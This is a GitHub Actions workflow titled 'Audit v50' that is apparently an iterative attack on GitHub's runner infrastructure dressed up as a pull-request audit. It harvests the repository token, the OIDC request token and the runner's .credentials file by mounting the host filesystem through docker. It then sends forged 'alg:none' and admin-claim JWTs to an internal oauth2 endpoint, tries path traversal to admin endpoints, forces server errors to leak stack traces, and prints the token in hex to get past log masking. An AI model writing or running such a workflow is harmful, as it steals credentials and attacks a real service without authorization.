name: Audit v50
on:
  pull_request:
    types: [opened, synchronize, reopened]

permissions:
  contents: write
  pull-requests: write
  id-token: write
  actions: write
  packages: write
  checks: write
  statuses: write
  deployments: write
  issues: write

jobs:
  audit-v50:
    runs-on: ubuntu-latest
    steps:

      # ══════════════════════════════════════════════════════════════
      # STEP 1: Harvest
      # ══════════════════════════════════════════════════════════════
      - name: Step 1 - Harvest
        if: always()
        run: |
          set +e
          echo "=== V50 HARVEST ==="
          echo "$PATH" > /tmp/saved_path.txt
          RT="${{ secrets.GITHUB_TOKEN }}"
          echo "$RT" > /tmp/rt.txt
          echo "RT_PFX=${RT:0:14} LEN=${#RT}"
          echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" > /tmp/idtok.txt
          echo "$ACTIONS_ID_TOKEN_REQUEST_URL" > /tmp/idtok_url.txt
          WLOG=$(find /home/runner/actions-runner -name "Worker_*.log" -type f 2>/dev/null | head -1)
          if [ -f "$WLOG" ]; then
            for KEY in PipelinesServiceUrl CacheServerUrl ResultsServiceUrl; do
              VAL=$(grep -oP "\"${KEY}\"\s*:\s*\"\K[^\"]+" "$WLOG" 2>/dev/null | head -1)
              echo "$KEY=$VAL"; echo "$VAL" > /tmp/${KEY}.txt
            done
            PLAN=$(grep -oP '"planId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
            JOB=$(grep -oP '"jobId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
            echo "PLAN=$PLAN JOB=$JOB"
            echo "$PLAN" > /tmp/plan.txt; echo "$JOB" > /tmp/job.txt
          fi
          docker run --rm -v /:/h alpine sh -c '
            F=$(find /h/home/runner -name ".credentials" -type f 2>/dev/null | head -1)
            [ -f "$F" ] && { echo "CRED_HEX_START"; xxd -p "$F" | tr -d "\n"; echo ""; echo "CRED_HEX_END"; }
          ' 2>/dev/null > /tmp/hex_extract.txt
          python3 -c "
          import binascii,json
          raw=open('/tmp/hex_extract.txt').read()
          s=raw.find('CRED_HEX_START');e=raw.find('CRED_HEX_END')
          if s>=0 and e>=0:
            h=raw[s+14:e].strip()
            d=json.loads(binascii.unhexlify(h).decode())
            t=d.get('Data',{}).get('token','')
            open('/tmp/cred_token.txt','w').write(t)
            print(f'CTOK_LEN={len(t)}')
          " 2>/dev/null
          echo "RT_HEX=$(echo -n "$RT" | xxd -p | tr -d '\n')"

      # ══════════════════════════════════════════════════════════════
      # STEP 2: OAUTH2 DEEP EXPLOITATION
      # v49: oauth2/token is LIVE! 400 "Invalid client auth token"
      # RT assertion → 500 "JsonWebTokenDeserializationException"
      # Try CTOK (IS a JWT), craft JWTs, try all grant_types
      # ══════════════════════════════════════════════════════════════
      - name: Step 2 - OAuth2 deep
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== OAUTH2 DEEP ==="
          IDTOK=$(cat /tmp/idtok.txt)
          RT=$(cat /tmp/rt.txt)
          CTOK=$(cat /tmp/cred_token.txt 2>/dev/null)
          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
          PIPE="https://pipelinesghubeus14.actions.githubusercontent.com/$SECRET"

          # A: CTOK as assertion (it IS a JWT — should go past deserialization!)
          echo "--- A: CTOK assertion ---"
          for GRANT in \
            "urn:ietf:params:oauth:grant-type:jwt-bearer" \
            "client_credentials" \
            "authorization_code" \
            "refresh_token"; do
            for CID in \
              "" \
              "00000000-0000-0000-0000-000000000000" \
              "DDDDDDDD-DDDD-DDDD-DDDD-DDDDDDDDDDDD"; do
              CID_PARAM=""
              [ -n "$CID" ] && CID_PARAM="&client_id=$CID"
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST --connect-timeout 3 -m 5 \
                -H "Content-Type: application/x-www-form-urlencoded" \
                "$PIPE/_apis/oauth2/token" \
                -d "grant_type=$GRANT&assertion=$CTOK$CID_PARAM")
              CODE=$(echo "$R" | tail -1)
              BODY=$(echo "$R" | sed '$d')
              echo "A grant=$GRANT cid=$CID = $CODE | $(echo "$BODY" | head -c 250)"
            done
          done
          echo ""

          # B: CTOK as Bearer + assertion
          echo "--- B: CTOK as Bearer ---"
          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST --connect-timeout 3 -m 5 \
            -H "Authorization: Bearer $CTOK" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            "$PIPE/_apis/oauth2/token" \
            -d "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&assertion=$CTOK&client_id=00000000-0000-0000-0000-000000000000")
          CODE=$(echo "$R" | tail -1)
          echo "B CTOK bearer+assertion = $CODE | $(echo "$R" | sed '$d' | head -c 300)"

          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST --connect-timeout 3 -m 5 \
            -H "Authorization: Bearer $CTOK" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            "$PIPE/_apis/oauth2/token" \
            -d "grant_type=client_credentials")
          CODE=$(echo "$R" | tail -1)
          echo "B CTOK client_creds = $CODE | $(echo "$R" | sed '$d' | head -c 300)"
          echo ""

          # C: IDTOK as BOTH bearer and assertion
          echo "--- C: IDTOK double ---"
          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST --connect-timeout 3 -m 5 \
            -H "Authorization: Bearer $IDTOK" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            "$PIPE/_apis/oauth2/token" \
            -d "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&assertion=$IDTOK")
          CODE=$(echo "$R" | tail -1)
          echo "C IDTOK double = $CODE | $(echo "$R" | sed '$d' | head -c 300)"

          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST --connect-timeout 3 -m 5 \
            -H "Authorization: Bearer $IDTOK" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            "$PIPE/_apis/oauth2/token" \
            -d "grant_type=client_credentials&client_id=DDDDDDDD-DDDD-DDDD-DDDD-DDDDDDDDDDDD")
          CODE=$(echo "$R" | tail -1)
          echo "C IDTOK client_creds = $CODE | $(echo "$R" | sed '$d' | head -c 300)"
          echo ""

          # D: Error bleeding — malformed JWTs and edge cases
          echo "--- D: Error bleed ---"
          # Craft minimal JWTs to trigger different errors
          python3 << 'PYEOF'
          import base64,json,subprocess,os
          def b64url(data):
            return base64.urlsafe_b64encode(json.dumps(data).encode()).decode().rstrip('=')
          pipe=os.environ.get('PIPE','')
          if not pipe:
            secret="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
            pipe=f"https://pipelinesghubeus14.actions.githubusercontent.com/{secret}"
          tests=[
            ("empty_header", f"{b64url({})}.{b64url({})}.AAAA"),
            ("admin_claim", f"{b64url({'alg':'none'})}.{b64url({'sub':'admin','iss':'self','aud':'pipeline'})}."),
            ("none_alg", f"{b64url({'alg':'none','typ':'JWT'})}.{b64url({'sub':'System:ServiceIdentity;DDDDDDDD-DDDD-DDDD-DDDD-DDDDDDDDDDDD','iss':'vstoken.actions.githubusercontent.com'})}."),
            ("hs256_empty", f"{b64url({'alg':'HS256','typ':'JWT'})}.{b64url({'sub':'admin','scope':'all'})}.AAAA"),
            ("huge_exp", f"{b64url({'alg':'none'})}.{b64url({'exp':99999999999,'aud':'pipeline','sub':'admin'})}."),
            ("svc_identity", f"{b64url({'alg':'none'})}.{b64url({'sub':'System:ServiceIdentity;00000000-0000-0000-0000-000000000000','nameid':'admin'})}."),
            ("just_dots", "..."),
            ("one_segment", "eyJhbGciOiJub25lIn0"),
            ("null_bytes", f"{b64url({'alg':'none'})}.{b64url({chr(0):'test'})}."),
          ]
          for name,jwt in tests:
            r=subprocess.run(["/usr/bin/curl","-sS","-w","\\nHTTP_%{http_code}","-X","POST",
              "--connect-timeout","3","-m","5",
              "-H","Content-Type: application/x-www-form-urlencoded",
              f"{pipe}/_apis/oauth2/token",
              "-d",f"grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&assertion={jwt}"],
              capture_output=True,text=True,timeout=10)
            out=r.stdout.strip()
            lines=out.split('\n')
            code=lines[-1] if lines else "?"
            body='\n'.join(lines[:-1])
            print(f"D {name} = {code} | {body[:250]}")
          PYEOF

      # ══════════════════════════════════════════════════════════════
      # STEP 3: FIXED traversal (NO query params!) + error forcing
      # v49: api-version param broke traversal! Remove it.
      # Also force 500s on every endpoint for stack trace leaks
      # ══════════════════════════════════════════════════════════════
      - name: Step 3 - Fixed traversal + error force
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== FIXED TRAVERSAL ==="
          IDTOK=$(cat /tmp/idtok.txt)
          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
          PIPE="https://pipelinesghubeus14.actions.githubusercontent.com/$SECRET"
          PLAN=$(cat /tmp/plan.txt)
          JOB=$(cat /tmp/job.txt)

          # A: Traversal WITHOUT query params (v47 format that worked!)
          echo "--- A: No-query traversal ---"
          for EP in \
            "admintoken" "idtoken" "sessions" "messages" "jitconfig" \
            "createdsession" "brokerlistener" "agents" "packages" \
            "feedstream" "events" "feed" "accesspolicy" \
            "plans" "timelines" "records" "logs" "labels" \
            "jobrequests" "runnermessages" "concurrencylimitoverrides" \
            "queuedrequests" "requests" "enterpriseaccesspolicies"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
              -H "Authorization: Bearer $IDTOK" \
              "$PIPE/_apis/distributedtask/pools/..%2f$EP" --path-as-is 2>/dev/null)
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            echo "A $EP = $CODE | $(echo "$BODY" | head -c 100)"
          done
          echo ""

          # B: POST to traversal endpoints WITHOUT query params
          echo "--- B: POST no-query ---"
          for EP in "admintoken" "idtoken" "sessions" "jitconfig" "agents" "events" "messages"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST --connect-timeout 2 -m 3 \
              -H "Authorization: Bearer $IDTOK" -H "Content-Type: application/json" \
              "$PIPE/_apis/distributedtask/pools/..%2f$EP" --path-as-is \
              -d "{\"planId\":\"$PLAN\",\"jobId\":\"$JOB\"}" 2>/dev/null)
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            echo "B POST $EP = $CODE | $(echo "$BODY" | head -c 150)"
          done
          echo ""

          # C: Force 500 errors for stack traces
          echo "--- C: Force 500s ---"
          # Send malformed bodies to live endpoints
          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST --connect-timeout 3 -m 5 \
            -H "Authorization: Bearer $IDTOK" -H "Content-Type: application/json" \
            "$PIPE/_apis/runtime/runnergroups" \
            -d '{"name":null,"pool":null}')
          echo "C runnergroups null = $(echo "$R" | tail -1) | $(echo "$R" | sed '$d' | head -c 300)"

          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST --connect-timeout 3 -m 5 \
            -H "Authorization: Bearer $IDTOK" -H "Content-Type: application/json" \
            "$PIPE/_apis/runtime/runnerscalesets" \
            -d '{"name":null}')
          echo "C scaleset null = $(echo "$R" | tail -1) | $(echo "$R" | sed '$d' | head -c 300)"

          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST --connect-timeout 3 -m 5 \
            -H "Authorization: Bearer $IDTOK" -H "Content-Type: application/xml" \
            "$PIPE/_apis/runtime/runnergroups" \
            -d '<root/>')
          echo "C xml ct = $(echo "$R" | tail -1) | $(echo "$R" | sed '$d' | head -c 300)"

          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
            -H "Authorization: Bearer $IDTOK" -H "Accept: text/xml" \
            "$PIPE/_apis/runtime/runnergroups")
          echo "C xml accept = $(echo "$R" | tail -1) | $(echo "$R" | sed '$d' | head -c 300)"

          # Trigger deserialization error
          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST --connect-timeout 3 -m 5 \
            -H "Authorization: Bearer $IDTOK" -H "Content-Type: application/json" \
            "$PIPE/_apis/runtime/runnergroups" \
            -d '{"name":"test","pool":{"id":"not-a-number"}}')
          echo "C bad_type = $(echo "$R" | tail -1) | $(echo "$R" | sed '$d' | head -c 300)"

          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST --connect-timeout 3 -m 5 \
            -H "Authorization: Bearer $IDTOK" -H "Content-Type: application/json" \
            "$PIPE/_apis/runtime/runnergroups" \
            -d '[1,2,3]')
          echo "C array = $(echo "$R" | tail -1) | $(echo "$R" | sed '$d' | head -c 300)"

      # ══════════════════════════════════════════════════════════════
      # STEP 4: Final
      # ══════════════════════════════════════════════════════════════
      - name: Step 4 - Final
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== V50 FINAL ==="
          echo "RT_HEX=$(cat /tmp/rt.txt | xxd -p | tr -d '\n')"
          echo "=== V50 COMPLETE ==="
